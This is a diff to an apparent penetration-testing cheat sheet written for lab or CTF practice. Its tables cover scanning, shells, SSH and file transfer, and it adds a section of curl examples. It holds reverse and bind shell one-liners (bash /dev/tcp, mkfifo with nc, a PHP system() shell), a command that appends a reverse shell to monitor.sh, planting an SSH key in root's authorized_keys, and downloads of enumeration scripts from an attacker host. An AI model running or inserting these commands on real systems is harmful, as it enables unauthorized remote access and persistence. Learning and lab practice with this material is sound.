@@ -1,6 +1,6 @@
-# infosec
+# Infosec
 
-## sheetcheat
+## Sheetcheat
 
 ### Service Scanning
 | Description        | Command      |
@@ -43,9 +43,9 @@
 | Test php code execution | `` <?php system('id'); ?> `` |
 | Start a nc listener on a local port | `` nc -lvnp 1234 `` |
 | Send a reverse shell from the remote server | `` bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1' `` |
-| Another command to send a reverse shell from the remote server | `` rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f `` |
-| Start a bind shell on the remote server | `` rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1 \| nc -lvp 1234 >/tmp/f `` |
-| Start a reverse shell from php | `` <?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1\|nc 10.10.14.2 9443 >/tmp/f"); ?> `` |
+| Another command to send a reverse shell from the remote server | `` rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/sh -i 2>&1\|nc 10.10.10.10 1234 >/tmp/f `` |
+| Start a bind shell on the remote server | `` rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/bash -i 2>&1 \| nc -lvp 1234 >/tmp/f `` |
+| Start a reverse shell from php | `` <?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/sh -i 2>&1\|nc 10.10.14.2 4444 >/tmp/f"); ?> `` |
 | Connect to a bind shell started on the remote server | `` nc 10.10.10.1 1234	 `` |
 | Upgrade shell TTY (1) | ``python -c 'import pty; pty.spawn("/bin/bash")' `` |
 | Upgrade shell TTY (2) | `` ctrl+z then stty raw -echo then fg then enter twice `` |
@@ -63,6 +63,7 @@
 | Create a new SSH key | `` ssh-keygen -f key	`` |
 | Add the generated public key to the user | `` echo "ssh-rsa AAAAB...SNIP...M= user@parrot" >> /root/.ssh/authorized_keys `` |
 | SSH to the server with the generated private key | `` ssh root@10.10.10.10 -i key	`` |
+| Add a reverse shell at the end of file | `` echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1\|nc 10.10.14.2 8443 >/tmp/f' | tee -a monitor.sh ``
 
 ### Transferring Files
 | Description        | Command      |
@@ -70,11 +71,29 @@
 | Start a local webserver | `` python3 -m http.server 8000	`` |
 | Download a file on the remote server from our local machine | `` wget http://10.10.14.1:8000/linpeas.sh	`` |
 | Download a file on the remote server from our local machine | `` curl http://10.10.14.1:8000/linenum.sh -o linenum.sh	`` |
-| Start a local webserver | `` python3 -m http.server 8000	`` |
 | Transfer a file to the remote server with scp (requires SSH access) | `` scp linenum.sh user@remotehost:/tmp/linenum.sh	`` |
 | Convert a file to base64 | `` base64 shell -w 0	`` |
 | Convert a file from base64 back to its orig | ``echo f0VMR...SNIO...InmDwU | base64 -d > shell `` |
 | Check the file's md5sum to ensure it converted correctly | `` md5sum shell `` |
+
+
+### Using Curl
+| Description        | Command      |
+| ------ | ----- |
+| GET request with cURL | ``  curl http://example.com	`` |
+| Verbose GET request with cURL | `` curl http://example.com -v  `` |
+| cURL Basic Auth login | `` curl http://admin:password@example.com/ -vvv	`` |
+| Alternate cURL Basic Auth login | `` curl -u admin:password http://example.com/ -vvv `` |
+| cURL Basic Auth login, follow redirection | `` curl -u admin:password -L http://example.com/ `` |
+| cURL GET request with parameter | `` pcurl -u admin:password 'http://example.com/search.php?port_code=us'	`` |
+| POST request with cURL | `` curl -d 'username=admin&password=password' -L http://example.com/login.php	`` |
+| Debugging with cURL | ``  curl -d 'username=admin&password=password' -L http://example.com/login.php -v	`` |
+| Cookie usage with cURL | ``  curl -d 'username=admin&password=password' -L --cookie-jar /dev/null http://example.com/login.php -v	`` |
+| cURL with cookie file | ``  curl -d 'username=admin&password=password' -L --cookie-jar cookies.txt http://example.com/login.php	`` |
+| cURL specify content type | ``  curl -H 'Content-Type: application/json' -d '{ "username" : "admin", "password" : "password" }'	`` |
+| cURL OPTIONS request | ``  curl -X OPTIONS http://example.com/ -vv	`` |
+| File upload with cURL | ``  curl -X PUT -d @test.txt http://example.com/test.txt -vv `` |
+| DELETE method with cURL | ``  curl -X DELETE http://example.com/test.txt -vv	`` |
 
 ## Pentesting iteration
 
